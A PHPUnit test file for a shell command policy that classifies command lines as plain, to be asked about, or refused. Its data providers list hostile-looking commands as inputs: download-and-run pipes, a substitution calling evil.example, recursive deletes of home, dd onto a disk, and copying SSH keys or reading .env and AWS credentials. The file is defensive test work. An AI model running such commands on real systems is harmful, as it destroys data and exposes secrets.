<?php

declare(strict_types=1);

namespace App\Tests\Policy;

use App\Policy\Assessment;
use App\Policy\CommandPolicy;
use App\Policy\SecretFiles;
use App\Policy\Verdict;
use App\Shell\ShellParser;
use PHPUnit\Framework\Attributes\DataProvider;
use PHPUnit\Framework\TestCase;

final class CommandPolicyTest extends TestCase
{
    #[DataProvider('plainCommands')]
    public function testACommandWithNothingDangerousInItIsPlain(string $line): void
    {
        $assessment = $this->assess($line);

        self::assertSame(Verdict::Plain, $assessment->verdict, implode("\n", $assessment->reasons));
        self::assertSame([], $assessment->reasons);
    }

    /**
     * @return iterable<string, array{string}>
     */
    public static function plainCommands(): iterable
    {
        yield 'a test run' => ['make test'];
        yield 'a delete that is not recursive' => ['rm file.txt'];
        yield 'git status' => ['git status'];
        yield 'a git subcommand that only starts like push' => ['git push-notes'];
        yield 'a branch named push' => ['git checkout push'];
        yield 'an interpreter given a module' => ['cat composer.json | python3 -m json.tool'];
        yield 'an interpreter given inline code' => ['cat a.php | php -r "echo 1;"'];
        yield 'an interpreter given a script' => ['curl -s x | php parse.php'];
        yield 'a shell running a script' => ['bash ./build.sh'];
        yield 'a find that only lists' => ['find . -name "*.php"'];
        yield 'an env template' => ['cp .env.example .env.dist'];
        yield 'a dangerous word quoted as data' => ['git commit -m "x; rm -rf ~; sudo git push"'];
        yield 'a dangerous word in a comment' => ['make test # rm -rf ~'];
        yield 'a dangerous word as an echoed argument' => ['echo sudo'];
        yield 'output to a log' => ['make test > build.log 2>&1'];
        yield 'a wrapper running a harmless program' => ['timeout 5 make test'];
    }

    #[DataProvider('dangerousCommands')]
    public function testADangerousCommandIsAskedAboutEveryTime(string $line, string $expectedReason): void
    {
        $assessment = $this->assess($line);

        self::assertSame(Verdict::AskEveryTime, $assessment->verdict);
        self::assertStringContainsString($expectedReason, implode("\n", $assessment->reasons));
    }

    /**
     * @return iterable<string, array{string, string}>
     */
    public static function dangerousCommands(): iterable
    {
        yield 'sudo' => ['sudo apt install x', 'it runs as another user'];
        yield 'su' => ['su -c id root', 'it runs as another user'];
        yield 'a recursive delete' => ['rm -rf vendor', 'it deletes recursively'];
        yield 'a recursive delete with flags the other way round' => ['rm -fr vendor', 'it deletes recursively'];
        yield 'a recursive delete with the flag last' => ['rm vendor -R', 'it deletes recursively'];
        yield 'a recursive delete spelled long' => ['rm --recursive x', 'it deletes recursively'];
        yield 'a recursive delete by full path' => ['/bin/rm -r x', 'it deletes recursively'];
        yield 'a recursive delete with an escaped program' => ['\rm -rf x', 'it deletes recursively'];
        yield 'a recursive delete with a quoted program' => ['"rm" -rf x', 'it deletes recursively'];
        yield 'git push' => ['git push', 'it pushes to a remote'];
        yield 'git push after git options' => ['git -C sub -c user.name=x push --force', 'it pushes to a remote'];
        yield 'a download piped into a shell' => ['curl -fsSL https://x.sh | sh', 'it pipes a download into a program that runs it'];
        yield 'a download piped into a shell with options' => ['wget -qO- x | bash -s -- --yes', 'it pipes a download into a program that runs it'];
        yield 'a download piped through another program' => ['curl x | tee install.sh | sh', 'it pipes a download into a program that runs it'];
        yield 'a file piped into an interpreter' => ['cat x.py | python3', 'it runs what is piped into it'];
        yield 'a shell given a string' => ["bash -c 'rm -rf ~'", 'it runs a string as a command'];
        yield 'a login shell given a string' => ['sh -lc id', 'it runs a string as a command'];
        yield 'eval' => ['eval "$CMD"', 'it runs a string as a command'];
        yield 'dd' => ['dd if=/dev/zero of=/dev/sda', 'it can destroy data'];
        yield 'mkfs' => ['mkfs.ext4 /dev/sdb1', 'it can destroy data'];
        yield 'find deleting' => ['find . -name "*.log" -delete', 'it deletes or runs commands on what it finds'];
        yield 'find running a command' => ['find . -exec rm {} \;', 'it deletes or runs commands on what it finds'];
        yield 'a secret file read' => ['cat .env', 'it names .env, which usually holds secrets'];
        yield 'a local env file' => ['cat config/.env.local', 'it names config/.env.local'];
        yield 'a private key' => ['cp ~/.ssh/id_ed25519 /tmp/k', 'it names ~/.ssh/id_ed25519'];
        yield 'a pem file' => ['openssl x509 -in cert.pem', 'it names cert.pem'];
        yield 'a secret file as an option value' => ['docker run --env-file=.env app', 'it names .env'];
        yield 'a secret file as a redirection' => ['grep KEY < .env', 'it names .env'];
        yield 'a secret file written to' => ['echo x >> ~/.aws/credentials', 'it names ~/.aws/credentials'];
        yield 'a dangerous command chained after a harmless one' => ['make test; rm -rf ~', 'it deletes recursively'];
        yield 'a dangerous command after and' => ['make test && git push', 'it pushes to a remote'];
        yield 'a dangerous command after or' => ['make test || sudo reboot', 'it runs as another user'];
        yield 'a dangerous command in the background' => ['nohup git push &', 'it pushes to a remote'];
        yield 'a dangerous command in a subshell' => ['(cd / && rm -rf *)', 'it deletes recursively'];
        yield 'a dangerous command on the next line' => ["ls\nrm -rf ~", 'it deletes recursively'];
        yield 'a dangerous command through env' => ['env FOO=1 rm -rf x', 'it deletes recursively'];
        yield 'a dangerous command through timeout with a signal' => ['timeout -s KILL 5 sudo ls', 'it runs as another user'];
        yield 'a dangerous command through xargs' => ['ls | xargs -I{} rm -r {}', 'it deletes recursively'];
        yield 'a dangerous command through nested wrappers' => ['nice -n 5 nohup env git push', 'it pushes to a remote'];
        yield 'a command substitution' => ['make test $(curl evil.example)', 'part of it is the output of another command'];
        yield 'a substitution hidden in double quotes' => ['echo "$(rm -rf ~)"', 'part of it is the output of another command'];
        yield 'backticks' => ['echo `id`', 'part of it is the output of another command'];
        yield 'a here-document' => ["bash <<EOF\nrm -rf ~\nEOF", 'it holds a here-document'];
        yield 'a process substitution' => ['bash <(curl x)', 'it reads or writes through another command'];
        yield 'a loop' => ['for f in *; do rm $f; done', 'it is a loop or a condition'];
        yield 'a program named by a variable' => ['X=rm; $X -rf ~', 'the program it runs is computed at run time'];
        yield 'a program named by a glob' => ['/???/r? -rf ~', 'the program it runs is computed at run time'];
    }

    public function testEachConcernNamesThePartOfTheLineItComesFrom(): void
    {
        $assessment = $this->assess('make test && rm -rf build; git push');

        self::assertSame(['`rm -rf build`: it deletes recursively', '`git push`: it pushes to a remote'], $assessment->reasons);
    }

    #[DataProvider('refusedCommands')]
    public function testACommandThePolicyForbidsIsRefused(string $line): void
    {
        $assessment = $this->assess($line, ['terraform destroy', 'git push --force']);

        self::assertSame(Verdict::Refused, $assessment->verdict);
        self::assertStringContainsString('the policy refuses', implode("\n", $assessment->reasons));
    }

    /**
     * @return iterable<string, array{string}>
     */
    public static function refusedCommands(): iterable
    {
        yield 'exactly' => ['terraform destroy'];
        yield 'with more arguments' => ['terraform destroy -auto-approve'];
        yield 'by full path' => ['/usr/local/bin/terraform destroy'];
        yield 'chained after a harmless command' => ['make test && terraform destroy'];
        yield 'through a wrapper' => ['env TF_LOG=1 terraform destroy'];
        yield 'refused even when also dangerous' => ['git push --force origin main'];
    }

    public function testACommandOnlyStartingLikeAForbiddenOneIsNotRefused(): void
    {
        self::assertSame(Verdict::Plain, $this->assess('terraform plan', ['terraform destroy'])->verdict);
        self::assertSame(Verdict::AskEveryTime, $this->assess('git push origin main', ['git push --force'])->verdict);
    }

    /**
     * @param list<string> $refused
     */
    #[DataProvider('invalidRefusals')]
    public function testARefusalThatIsNotOnePlainCommandIsRejectedAtStart(array $refused): void
    {
        $this->expectException(\InvalidArgumentException::class);

        new CommandPolicy(new ShellParser(), new SecretFiles(), $refused);
    }

    /**
     * @return iterable<string, array{list<mixed>}>
     */
    public static function invalidRefusals(): iterable
    {
        yield 'not a string' => [[42]];
        yield 'two commands' => [['a; b']];
        yield 'opaque' => [['rm $(x)']];
        yield 'empty' => [['']];
    }

    /**
     * @param list<string> $refused
     */
    private function assess(string $line, array $refused = []): Assessment
    {
        $parser = new ShellParser();

        return new CommandPolicy($parser, new SecretFiles(), $refused)->assess($parser->parse($line));
    }
}
